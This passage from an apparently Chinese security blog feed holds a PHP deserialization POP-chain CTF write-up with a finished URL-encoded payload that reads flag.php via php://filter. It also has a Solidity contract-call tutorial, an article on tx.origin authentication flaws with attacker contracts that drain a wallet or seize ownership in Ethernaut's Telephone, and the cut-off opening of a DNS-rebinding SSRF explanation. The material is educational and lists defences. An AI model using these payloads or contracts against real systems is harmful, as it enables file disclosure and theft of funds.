class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>代码分析：</p><p><strong>GET</strong> 请求的 <strong>pop</strong> 参数可控，利用 <strong>Modifier</strong> 类中的 <strong>append</strong> 方法就可以包含 <strong>flag</strong>，实例化一个对象时会先执行对象中的 <code>__wakeup()</code> 方法，而 <strong>Show</strong> 类中的 <code>__wakeup</code> 方法的 <strong>source</strong> 也可控，可以构造 <strong>pop</strong> 链：</p><ul><li>构造 <code>$source = new Show</code>，在 <strong>Show</strong> 中首先执行 <code>__wakeup</code>方法，又因为  <code>__wakeup</code> 方法中的 <code>source</code> 参数指向一个类，当类被用作字符串输出时会触发该类的 <code>__toString()</code> 方法</li><li>再构造 <strong>Show</strong> 中的 <strong>str</strong> 参数，使 <code>$str = new Test</code>，当执行 <code>__toString()</code> 方法时，<code>return $this-&gt;str-&gt;source</code>会取 str(new Test) 类中的 <strong>source</strong> 值，当读取不可访问（protected 或 private）或不存在的属性的值时会去调用 <code>__get()</code> 方法，即 <strong>Test</strong> 类中的 <code>__get()</code> 方法；</li><li>执行 <code>__get()</code> 方法时会返回一个 <strong>function</strong>，构造 <code>$p = new Modifer</code>，即将类变量作为函数去调用，此时会执行该类中的 <code>__invoke()</code> 方法；</li><li>最后构造 <code>$var = &#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;</code>，在执行 <strong>__invoke()</strong> 方法时将 <strong>var</strong> 作为参数去调用 <strong>Modifer</strong> 类下的 <strong>append</strong> 方法，最后利用 <strong>php://</strong> 伪协议读取 <strong>flag</strong>。</li></ul><p>所以最终的 <strong>payload</strong> 为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span> -&gt; str = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; source = <span class="variable">$a</span>;</span><br><span class="line">var_dump(<span class="variable">$b</span>);</span><br><span class="line">var_dump(urlencode(serialize(<span class="variable">$b</span>)));  </span><br><span class="line"><span class="comment">//因为 $var 为 protected变量，所以需要添加\0*\0，这里使用 urlencode编码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//payload O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3Bs%3A0%3A%22%22%3B%7D</span></span><br></pre></td></tr></table></figure><p>整个流程结构如下图：</p><p><img src="/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt="4"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-原理介绍&quot;&gt;&lt;a href=&quot;#0x01-原理介绍&quot; class=&quot;headerlink&quot; title=&quot;0x01 原理介绍&quot;&gt;&lt;/a&gt;0x01 原理介绍&lt;/h4&gt;&lt;p&gt;php反序列化即所有php中的值都可以使用 serialize() 函数来返回一个包</summary>
      
    
    
    
    <category term="Web" scheme="https://banana69.site/categories/Web/"/>
    
    
    <category term="反序列化" scheme="https://banana69.site/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Solididy合约调用</title>
    <link href="https://banana69.site/2021/10/15/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/"/>
    <id>https://banana69.site/2021/10/15/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/</id>
    <published>2021-10-15T01:24:02.000Z</published>
    <updated>2021-10-17T12:07:53.656Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Solidity</strong> 提供了几种调用其他合约的方法，如 (call, send, delegatecall, callcode) 等。</p><h4 id="一、创建新实例"><a href="#一、创建新实例" class="headerlink" title="一、创建新实例"></a>一、创建新实例</h4><p>调用另一份合约最安全的方法是创建其他合约，以确定它的接口和行为来实例化它，通过关键字 <strong>new</strong> 来实例化需要调用的合约。在 <strong>Solidity</strong> 中，关键字 <strong>new</strong> 将在区块链上创建合约并返回一个可用于引用它的对象。</p><p>例如以下合约从另一个名为 <strong>Token</strong> 的合约中创建并调用 <strong>Faucet</strong> 合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Faucet&#123;</span><br><span class="line">    function withdraw(uint withdraw_amount) public &#123;</span><br><span class="line">        require(withdraw_amount &lt;= 100000000000000000);</span><br><span class="line">        msg.sender.transfer(withdraw_amount);</span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Token is Faucet &#123;</span><br><span class="line">Faucet _faucet;</span><br><span class="line"></span><br><span class="line">constructor() &#123;</span><br><span class="line">_faucet = new Faucet();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>new</strong> 关键字还可以接受可选参数来指定创建时传输的 <strong>Ether</strong> 值，以及传递给新合约的构造函数的参数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &quot;Faucet.sol&quot;</span><br><span class="line"></span><br><span class="line">contract Token is Faucet &#123;</span><br><span class="line">Faucet _faucet;</span><br><span class="line"></span><br><span class="line">constructor() &#123;</span><br><span class="line">_faucet = (new Faucet).value(0.5 ether)();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二、访问现有实例"><a href="#二、访问现有实例" class="headerlink" title="二、访问现有实例"></a>二、访问现有实例</h4><p>可以将现有合约的地址转换为实例来实现合约的调用，即将某个地址强制转换为某个合约类型，使用这种方法时已知接口应用于现有的实例。</p><p>如以下合约将地址作为参数提供给构造函数，并将其强制转换为合约对象：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import &quot;Faucet.sol&quot;</span><br><span class="line"></span><br><span class="line">contract Token is Fucet&#123;</span><br><span class="line">Faucet _faucet;</span><br><span class="line"></span><br><span class="line">constructor(address _addr)&#123;</span><br><span class="line">_faucet = Faucet(_addr);</span><br><span class="line">_faucet.withdraw(0.1 ether);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上的代码存在一定的风险，例如无法确定传入构造函数的地址是否是 Faucet 对象，也无法确定调用 <strong>withdraw</strong> 函数时是否可以与预期结果一致。</p><h4 id="三、底层函数调用"><a href="#三、底层函数调用" class="headerlink" title="三、底层函数调用"></a>三、底层函数调用</h4><p><strong>Solidity</strong> 提供了几种底层调用合约的方式，例如<code>call</code>，<code>delegatecall</code>和<code>codecall</code>，<code>call</code>的外部调用上下文是外部合约，而<code>delegatecall</code>的外部调用上下文是调用者合约，<code>callcode</code>的外部调用上下文是调用者合约，这里借用<strong>rickgray</strong>师傅的图：</p><p><img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/1.png" alt="1"></p><ul><li><p>当合约 <strong>A</strong> 以 <strong>call</strong> 调用外部合约 <strong>B</strong> 的 <strong>fun()</strong> 时，<strong>fun()</strong> 在 合约 <strong>B</strong> 的上下文执行，然后继续返回 合约 <strong>A</strong> 中继续执行，该调用会将内置的 <strong>msg.sender</strong> 的值修改为调用者；</p></li><li><p>当合约 <strong>A</strong> 以 <strong>delegatecall</strong> 调用外部合约 <strong>B</strong> 中的 <strong>fun()</strong> 函数时，<strong>fun()</strong> 函数在合约 <strong>A</strong> 的上下文条件下执行，该调用不会修改内置变量 **msf.sender **的值；</p></li><li><p>当合约 <strong>A</strong> 以 <strong>callcode</strong> 调用外部合约 <strong>B</strong> 中的 <strong>fun()</strong> 函数时，<strong>fun()</strong> 函数在合约 <strong>A</strong> 的上下文条件下执行，该调用不会修改内置变量 **msf.sender **的值。</p><blockquote><p>这里区分一下 <strong>tx.origin</strong> 和 <strong>msg.sender</strong> ，<strong>msg.sender</strong> 是函数的直接调用方，在用户手动调用该函数时是发起交易的账户地址，但也可以是调用该函数的一个智能合约的地址。而 <strong>tx.origin</strong> 则必然是这个交易的原始发起方，无论中间有多少次合约内 / 跨合约函数调用，而且一定是账户地址而不是合约地址。</p></blockquote></li></ul><p>从以下代码分析三种调用方式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.10;</span><br><span class="line"></span><br><span class="line">contract A&#123;</span><br><span class="line">    address public address_A;</span><br><span class="line">    uint256 public num_A;</span><br><span class="line">  </span><br><span class="line">    </span><br><span class="line">    function call(address addr) public &#123;</span><br><span class="line">        addr.call(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        //addr.delegatecall(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        //addr.callcode(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    function delegatecallcall(address addr) public &#123;</span><br><span class="line">        //addr.call(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        addr.delegatecall(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        //addr.callcode(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    function callcode(address addr) public &#123;</span><br><span class="line">        //addr.call(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        //addr.delegatecall(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">        addr.callcode(bytes4(keccak256(&quot;test()&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B&#123;</span><br><span class="line">    address public address_B;</span><br><span class="line">    uint256 public num_B = 100;</span><br><span class="line">    </span><br><span class="line">    function test() public &#123;</span><br><span class="line">        address_B = msg.sender;</span><br><span class="line">        num_B = 100;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从账户<code>0x5B38Da6a701c568545dCfcB03FcB875f56beddC4</code>分别部署合约 <strong>A</strong> 和 合约 <strong>B</strong>，可以看到合约 <strong>B</strong> 未被调用时的 <strong>msg.sender</strong> 和 <strong>num_b</strong> 分别如下图所示：</p><p><img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/2.png" alt="2"></p><ul><li><p>当合约 <strong>A</strong> 以 <strong>call</strong> 方式 调用合约 <strong>B</strong> 中的 <strong>test()</strong> 函数时：</p><p><strong>test()</strong> 函数的执行环境是在合约 <strong>B</strong> 中，所以此时的 <strong>msg.sender</strong> 是调用者的合约地址，即合约 <strong>A</strong> 的地址，而在合约 <strong>A</strong> 中，<strong>address_A</strong> 和 <strong>num_A</strong> 仍未改变；<img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/3.png" alt="3"></p></li><li><p>当合约 <strong>A</strong> 以 <strong>delegatecall</strong> 方式调用合约 <strong>B</strong> 中的 <strong>test()</strong> 函数时：</p><p>此时 <strong>test()</strong> 函数的执行环境是在合约 <strong>A</strong> 中，所以在调用结束后，合约 <strong>B</strong> 中 <strong>msg.sender</strong> 未被修改，而在合约 <strong>A</strong> 中，<strong>address_A</strong> 被赋值为发起调用的外部账户的地址，即部署合约 <strong>A</strong> 的账户的地址，<strong>num_A</strong> 被赋值为 <strong>num_B</strong>。</p><p>但此时合约 <strong>A</strong> 中的 <strong>num_A</strong> 会被覆盖。<img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/4.png" alt="4"></p></li><li><p>当合约 <strong>A</strong> 以 <strong>callcode</strong> 方式调用合约 <strong>B</strong> 中的 <strong>test()</strong> 函数时：</p><p>通过 <strong>callcode</strong> 调用时的上下文为调用者合约，即 <strong>test()</strong> 函数的执行环境为合约 <strong>A</strong>，所以在调用结束后，合约 <strong>B</strong> 中 <strong>msg.sender</strong> 未被修改，而在合约 <strong>A</strong> 中，<strong>address_A</strong> 被赋值为发起调用的合约的地址，即合约 <strong>A</strong> 的地址，<strong>num_A</strong> 被赋值为 <strong>num_B</strong>。<img src="/image/%E5%90%88%E7%BA%A6%E8%B0%83%E7%94%A8/5.png" alt="5"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;Solidity&lt;/strong&gt; 提供了几种调用其他合约的方法，如 (call, send, delegatecall, callcode) 等。&lt;/p&gt;
&lt;h4 id=&quot;一、创建新实例&quot;&gt;&lt;a href=&quot;#一、创建新实例&quot; class=&quot;headerl</summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>tx.origin 引发的安全问题</title>
    <link href="https://banana69.site/2021/10/09/tx-origin%E5%BC%95%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    <id>https://banana69.site/2021/10/09/tx-origin%E5%BC%95%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</id>
    <published>2021-10-09T04:42:54.000Z</published>
    <updated>2022-05-05T07:41:20.130Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-原理介绍"><a href="#0x01-原理介绍" class="headerlink" title="0x01 原理介绍"></a>0x01 原理介绍</h4><p><strong>tx.origin</strong> 是 <strong>Solidity</strong> 中的一个全局变量，它能够遍历调用栈并返回最初发送调用的账户地址，因此使用 <strong>tx.origin</strong> 进行身份验证时存在一定的安全问题，所以一般在合约中避免使用 <strong>tx.origin</strong> 进行身份验证。</p><p>通过以下代码了解：<strong>tx.origin</strong> 与 <strong>msg.sender</strong> 的区别：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setOwner() &#123;</span><br><span class="line">owner = msg.sender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function setOwner() &#123;</span><br><span class="line">owner = tx.origin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在调用链<code>A -&gt; B -&gt; C- &gt; D</code>中，若 <strong>D</strong> 内部的全局变量是 <strong>msg.sender</strong>， 它将指向最近的一笔交易，即是 <strong>C</strong>；若 <strong>D</strong> 内部的全局变量是 <strong>tx.origin</strong>，它将指向最初发送交易的账户地址，即是 <strong>A</strong>。</p><p> <strong>tx.origin</strong> ：</p><ul><li>只有用户钱包地址可以是 <strong>tx.origin</strong> （或合约拥有者的地址）；</li><li>可能是整个交易或调用链的原始调用者；</li><li>不可能是合约地址。</li></ul><p><strong>msg.sender</strong>:</p><ul><li>可能是特定交易或调用的发送者；</li><li>用户钱包或智能合约都可以是 <strong>msg.sender</strong>。</li></ul><h4 id="0x02-代码分析："><a href="#0x02-代码分析：" class="headerlink" title="0x02 代码分析："></a>0x02 代码分析：</h4><p>以下钱包合约使用 <strong>tx.origin</strong> 做身份认证</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.11;</span><br><span class="line"></span><br><span class="line">contract TxUserWallet &#123;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    function TxUserWallet() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferTo(address dest, uint amount) public &#123;</span><br><span class="line">        require(tx.origin == owner);</span><br><span class="line">        dest.transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该合约将合约所有者 <strong>owner</strong> 变量赋值给 <strong>tx.origin</strong> 变量，所以当 <strong>tx.origin</strong> 值为攻击者的地址时，会向攻击者进行转币操作，以下是攻击者合约。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.11;</span><br><span class="line"></span><br><span class="line">interface TxUserWallet &#123;</span><br><span class="line">    function transferTo(address dest, uint amount) public;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TxAttackWallet &#123;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    function TxAttackWallet() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() public &#123;</span><br><span class="line">        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设<strong>TxUserWallet</strong> 合约为 <strong>A</strong>，<strong>TxAttackWallet</strong> 合约为 <strong>B</strong>，首先 <strong>A</strong> 向 <strong>B</strong> 发送一定量的以太币，此时 <strong>A</strong> 的 <strong>owner</strong> 为合约 <strong>A</strong> 的地址，然后在 <strong>fallback</strong> 函数中调用 <strong>A</strong> 合约时，<strong>A</strong> 合约中的 <strong>tx.origin</strong> 为合约 <strong>A</strong> 的地址，所以会绕过 <strong>require()</strong> 的判断，完成转币操作。 </p><p>事实上，<strong>tx.origin</strong> 一般为合约拥有者的地址。</p><h4 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h4><p>以 <strong>ethernaut</strong> 中的 <strong>Telephone</strong> 为例，需要成为合约拥有者即可通过该挑战，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码可以知道只需要通过 <strong>if</strong> 判断即可设置合约的拥有者，这里使用了 <strong>tx.origin</strong>，使用以下攻击代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Call_Telephone&#123;</span><br><span class="line">    Telephone telephone;</span><br><span class="line">    </span><br><span class="line">    function set_contract(address _Telephone_Addr) public&#123;</span><br><span class="line">        telephone = Telephone(_Telephone_Addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function call_changeOwner() public &#123;</span><br><span class="line">        telephone.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过攻击合约去调用 <strong>Telephone</strong> 合约中的 <strong>changeOwner()</strong> 函数，当调用发生时，<strong>if</strong> 中的 <strong>tx.origin</strong> 为攻击者合约拥有者的地址，而 <strong>msg.sender</strong> 为合约 <strong>Telephone</strong> 的地址，所以通过 <strong>if</strong> 判断，获取合约所有权。</p><h4 id="0x04-漏洞防范"><a href="#0x04-漏洞防范" class="headerlink" title="0x04 漏洞防范"></a>0x04 漏洞防范</h4><p>在智能合约的鉴权机制中减少 <strong>tx.origin</strong>的使用。</p><p>通常使用 <strong>tx.origin</strong> 来区分调用者是一个账户而不是一个合约。</p><p>如：<code>if(msg.sender == tx.origin)</code>，如果调用者是一个账户，则上面的条件永远是 <strong>True</strong>，如果是合约账户，则为 <strong>False</strong>。</p><p>还可以通过<code>extcodesize(addr)</code>来判断地址是否为合约地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract assertContract &#123;</span><br><span class="line">    function isContract(address addr) public view returns (bool) &#123;</span><br><span class="line">    uint256 size;</span><br><span class="line">    assembly &#123; size := extcodesize(addr) &#125;</span><br><span class="line">    return size &gt; 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若只允许外部账户调用我们的合约，不允许合约账户调用我们的合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(tx.origin == msg.sender)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-原理介绍&quot;&gt;&lt;a href=&quot;#0x01-原理介绍&quot; class=&quot;headerlink&quot; title=&quot;0x01 原理介绍&quot;&gt;&lt;/a&gt;0x01 原理介绍&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;tx.origin&lt;/strong&gt; 是 &lt;strong&gt;Solid</summary>
      
    
    
    
    <category term="智能合约" scheme="https://banana69.site/categories/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    
    <category term="智能合约审计" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>DNS Rebinding</title>
    <link href="https://banana69.site/2021/10/06/DNS-Rebinding/"/>
    <id>https://banana69.site/2021/10/06/DNS-Rebinding/</id>
    <published>2021-10-06T07:21:46.000Z</published>
    <updated>2021-10-17T12:14:26.476Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h4><p><strong>DNS</strong> 重绑定是 <strong>SSRF</strong> 一种过滤绕过的方法，在 <strong>SSRF</strong> 中，一个常用的防护思路是：首先 <strong>DNS</strong> 服务器会对用户请求的 <strong>URL</strong> 参数进行解析，然后对于 <strong>DNS</strong> 服务器返回的 <strong>IP</strong> 地址进行判断，如果在黑名单中，就禁止该次请求。</p><p>但是在该过程中，第一次去请求 <strong>DNS</strong> 服务进行域名解析到第二次服务端去请求 <strong>URL</strong> 之间存在一个时间差，利用这个时间差就可以进行 <strong>DNS</strong> 重绑定攻击。 </p><p>要利用这个时间差就必须了解 <strong>DNS</strong> 生存时间<strong>（Time To Live)<strong>，简单的说就是 <strong>DNS</strong> 记录在 <strong>DNS</strong> 服务器上的缓存时间，</strong>TTL</strong> 值越小，修改记录各地生效的时间就越快。</p><p>当各地的 <strong>DNS (LDNS)</strong> 服务器接受到解析请求时，就会向域名指定的授权 <strong>DNS</strong> 服务器发出解析请求从而获得解析记录；该解析记录会在 <strong>DNS(LDNS)</strong> 服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，<strong>DNS</strong> 服务器不会再向授权 <strong>DNS</strong> 服务器发出请求，而是直接返回刚才获得的记录；而这个记录在 <strong>DNS</strong> 服务器上保留的时间，就是 <strong>TTL</strong> 值。</p><p>所以，当我们发起域名解析请求的时候，第一次访问会返回一个 <strong>IP</strong> 地址 <strong>A</strong>，但是当我们发起第二次域名解析请求的时候，域名持有者修改对应的 <strong>IP</strong> 地址， 会返回一个不同于 A 的 <strong>IP</strong> 地址 <strong>B</strong>，对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了 <strong>DNS Rebinding</strong> 攻击。</p><h4 id="0x02-过程"><a href="#0x02-过程" class="headerlink" title="0x02 过程"></a>0x02 过程</h4><p>在了解了以上概念以后可以基本明确 <strong>DNS</strong> 重绑定的过程，那么如果控制域名解析到不同的 <strong>IP</strong>，可以通过编写自己可控的 <strong>DNS</strong> 服务器，并将其 <strong>TTL</strong> 值设置为 <strong>0</strong> 或者很小，动态地控制域名解析地 <strong>IP</strong>地址，如下图所示。</p><p><img src="/image/DNS-Rebinding/1.png" alt="1"></p><p>这种 <strong>SSRF</strong> 思路地检查逻辑是在第一次 <strong>DNS</strong> 查询请求后判断 <strong>host</strong> 是否是内网 <strong>IP</strong>，第二次请求的时候存在一个小间隔，导致了解析的差异性。整体步骤可以总结为一下几点：</p><ul><li>服务器端获得 <strong>URL</strong> 参数，进行第一次 <strong>DNS</strong> 解析，获得了一个非内网的 <strong>IP</strong>；</li><li>对于获得的 <strong>IP</strong> 进行判断，发现为非黑名单 <strong>IP</strong>，则通过验证；</li><li>服务器端对于 <strong>URL</strong> 进行访问，由于 <strong>DNS</strong> 服务器设置的 <strong>TTL</strong> 为 <strong>0</strong>，所以再次进行 <strong>DNS</strong> 解析，这一次 <strong>DNS</strong> 服务器返回的是内网地址；</li><li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li></ul><h4 id="0x03-利用"><a href="#0x03-利用" class="headerlink" title="0x03 利用"></a>0x03 利用</h4><p>可以使用 <a 